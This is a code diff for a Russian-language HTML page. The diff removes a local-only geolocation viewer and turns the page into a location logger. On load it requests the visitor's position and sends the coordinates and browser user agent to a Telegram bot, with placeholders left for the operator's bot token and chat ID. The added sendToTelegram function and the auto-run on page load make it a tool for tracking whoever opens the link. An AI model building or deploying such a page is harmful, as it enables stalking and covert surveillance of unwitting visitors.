@@ -27,12 +27,10 @@
             padding: 30px 24px;
             max-width: 500px;
             width: 100%;
-            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.6);
             text-align: center;
         }
         .card h1 {
             font-size: 24px;
-            font-weight: 600;
             margin-bottom: 20px;
         }
         .card h1 span {
@@ -90,43 +88,19 @@
             color: #8b949e;
             margin-top: 4px;
         }
-        .btn-group {
-            display: flex;
-            gap: 10px;
-            flex-wrap: wrap;
-            justify-content: center;
-        }
-        .btn-group button {
-            flex: 1;
-            min-width: 100px;
-            padding: 10px 12px;
+        .btn {
+            background: #238636;
+            color: white;
             border: none;
+            padding: 10px 24px;
             border-radius: 10px;
             font-size: 14px;
             font-weight: 500;
             cursor: pointer;
             transition: 0.2s;
-            color: #fff;
         }
-        .btn-group .btn-primary {
-            background: #238636;
-        }
-        .btn-group .btn-primary:hover {
+        .btn:hover {
             background: #2ea043;
-        }
-        .btn-group .btn-secondary {
-            background: #21262d;
-            border: 1px solid #30363d;
-            color: #c9d1d9;
-        }
-        .btn-group .btn-secondary:hover {
-            background: #30363d;
-        }
-        .btn-group .btn-danger {
-            background: #da3633;
-        }
-        .btn-group .btn-danger:hover {
-            background: #f85149;
         }
         .footer {
             margin-top: 20px;
@@ -134,32 +108,6 @@
             color: #484f58;
             border-top: 1px solid #21262d;
             padding-top: 16px;
-        }
-        .footer a {
-            color: #58a6ff;
-            text-decoration: none;
-            cursor: pointer;
-        }
-        .log-area {
-            margin-top: 16px;
-            background: #0d1117;
-            border-radius: 8px;
-            padding: 10px;
-            max-height: 120px;
-            overflow-y: auto;
-            font-family: monospace;
-            font-size: 12px;
-            color: #8b949e;
-            border: 1px solid #21262d;
-            display: none;
-            text-align: left;
-        }
-        .log-area.show {
-            display: block;
-        }
-        .log-area .entry {
-            padding: 3px 0;
-            border-bottom: 1px solid #161b22;
         }
     </style>
 </head>
@@ -175,39 +123,29 @@
             <div class="accuracy" id="accuracyDisplay"></div>
         </div>
 
-        <div class="btn-group">
-            <button class="btn-primary" id="btnRefresh" onclick="getLocation()">🔄 Обновить</button>
-            <button class="btn-secondary" onclick="copyCoords()">📋 Копировать</button>
-            <button class="btn-danger" onclick="clearCoords()">🗑️ Очистить</button>
-        </div>
-
-        <div class="log-area" id="logArea">
-            <div style="display:flex; justify-content:space-between; margin-bottom:6px;">
-                <span>📋 История</span>
-                <button class="btn-secondary" style="flex:none; padding:2px 10px; font-size:11px;" onclick="copyLog()">Копировать всё</button>
-            </div>
-            <div id="logEntries"></div>
-        </div>
+        <button class="btn" id="btnRefresh" onclick="getLocation()">🔄 Обновить</button>
 
         <div class="footer">
-            ⚡ Данные только на этом устройстве •
-            <a onclick="toggleLog()">Показать историю</a>
+            ⚡ Данные отправляются в Telegram
         </div>
     </div>
 
     <script>
-        // ============================================================
-        // ★★★★★  НАСТРОЙКА  ★★★★★
-        // Вставь сюда свой адрес сервера (например, от ngrok)
-        // Если сервера нет — оставь пустым, данные будут только на экране
-        // ============================================================
-        const SERVER_URL = "";  // пример: "https://abc123.ngrok.io/location"
-        // ============================================================
+        // ★★★★★  ВСТАВЬ СВОИ ДАННЫЕ  ★★★★★
+        const BOT_TOKEN = "ТВОЙ_ТОКЕН_ОТ_BOTFATHER";
+        const CHAT_ID = "ТВОЙ_ID_ОТ_USERINFOBOT";
+        // ★★★★★ ★★★★★ ★★★★★
 
-        let lastCoords = null;
-        let history = [];
+        function sendToTelegram(lat, lon, acc) {
+            const text =
+                `📍 Новая геолокация!\n\nШирота: ${lat.toFixed(6)}\nДолгота: ${lon.toFixed(6)}\nТочность: ±${Math.round(acc)} м\n\nУстройство: ${navigator.userAgent}`;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+            }).catch(() => {});
+        }
 
-        // ====== ГЕОЛОКАЦИЯ ======
         function getLocation() {
             const statusText = document.getElementById('statusText');
             const coordsDisplay = document.getElementById('coordsDisplay');
@@ -236,44 +174,26 @@
                     const lon = pos.coords.longitude;
                     const acc = pos.coords.accuracy;
 
-                    lastCoords = { lat, lon, acc };
-                    history.push({ lat, lon, acc, time: new Date().toLocaleTimeString() });
-
                     coordsDisplay.textContent = `${lat.toFixed(6)}, ${lon.toFixed(6)}`;
                     accuracyDisplay.textContent = `±${Math.round(acc)} м`;
-                    statusText.textContent = '✅ Геолокация получена!';
+                    statusText.textContent = '✅ Отправлено в Telegram!';
                     statusText.className = 'text success';
                     loader.style.display = 'none';
                     btn.disabled = false;
 
-                    // Отправка на сервер (если указан)
-                    if (SERVER_URL) {
-                        fetch(SERVER_URL, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                lat: lat,
-                                lon: lon,
-                                accuracy: acc,
-                                device: navigator.userAgent,
-                                timestamp: Date.now()
-                            })
-                        }).catch(() => {});
-                    }
-
-                    updateLog();
+                    sendToTelegram(lat, lon, acc);
                 },
                 function(err) {
                     let msg = '';
                     switch (err.code) {
                         case 1:
-                            msg = '❌ Доступ запрещён! Разрешите геолокацию в браузере.';
+                            msg = '❌ Доступ запрещён! Разрешите геолокацию.';
                             break;
                         case 2:
                             msg = '❌ Сигнал недоступен. Проверьте GPS/WiFi.';
                             break;
                         case 3:
-                            msg = '❌ Таймаут. Попробуйте обновить страницу.';
+                            msg = '❌ Таймаут. Обновите страницу.';
                             break;
                         default:
                             msg = '❌ Ошибка: ' + err.message;
@@ -288,89 +208,9 @@
             );
         }
 
-        // ====== КОПИРОВАТЬ ======
-        function copyCoords() {
-            if (!lastCoords) {
-                alert('Нет координат для копирования');
-                return;
-            }
-            const text = `${lastCoords.lat.toFixed(6)}, ${lastCoords.lon.toFixed(6)}`;
-            navigator.clipboard?.writeText(text).then(() => {
-                const btn = document.querySelector('.btn-secondary');
-                const orig = btn.textContent;
-                btn.textContent = '✅ Скопировано!';
-                setTimeout(() => btn.textContent = orig, 1500);
-            }).catch(() => {
-                alert('Скопируйте вручную:\n' + text);
-            });
-        }
-
-        // ====== ОЧИСТИТЬ ======
-        function clearCoords() {
-            if (!lastCoords && history.length === 0) return;
-            lastCoords = null;
-            history = [];
-            document.getElementById('coordsDisplay').textContent = '—';
-            document.getElementById('accuracyDisplay').textContent = '';
-            document.getElementById('statusText').textContent = '🔄 Данные очищены';
-            document.getElementById('statusText').className = 'text';
-            document.getElementById('logEntries').innerHTML = '';
-            document.getElementById('logArea').classList.remove('show');
-        }
-
-        // ====== ЛОГ ======
-        function updateLog() {
-            const entries = document.getElementById('logEntries');
-            entries.innerHTML = history.map(h =>
-                `<div class="entry">${h.time} → ${h.lat.toFixed(6)}, ${h.lon.toFixed(6)} (±${Math.round(h.acc)} м)</div>`
-            ).join('');
-        }
-
-        function toggleLog() {
-            const area = document.getElementById('logArea');
-            area.classList.toggle('show');
-            if (area.classList.contains('show')) updateLog();
-        }
-
-        function copyLog() {
-            if (history.length === 0) {
-                alert('Нет записей');
-                return;
-            }
-            const text = history.map(h =>
-                `${h.time} | ${h.lat.toFixed(6)}, ${h.lon.toFixed(6)} | ±${Math.round(h.acc)} м`
-            ).join('\n');
-            navigator.clipboard?.writeText(text).catch(() => {});
-            alert('📋 История скопирована');
-        }
-
-        // ====== АВТОЗАПУСК ======
         window.onload = function() {
-            try {
-                const saved = sessionStorage.getItem('geo_history');
-                if (saved) {
-                    history = JSON.parse(saved);
-                    if (history.length > 0) {
-                        const last = history[history.length - 1];
-                        lastCoords = { lat: last.lat, lon: last.lon, acc: last.acc };
-                        document.getElementById('coordsDisplay').textContent =
-                            `${last.lat.toFixed(6)}, ${last.lon.toFixed(6)}`;
-                        document.getElementById('accuracyDisplay').textContent =
-                            `±${Math.round(last.acc)} м (кеш)`;
-                        document.getElementById('statusText').textContent = '📌 Из кеша';
-                        document.getElementById('statusText').className = 'text';
-                    }
-                }
-            } catch (e) {}
-
             setTimeout(getLocation, 500);
         };
-
-        setInterval(() => {
-            try {
-                sessionStorage.setItem('geo_history', JSON.stringify(history));
-            } catch (e) {}
-        }, 3000);
     </script>
 
 </body>
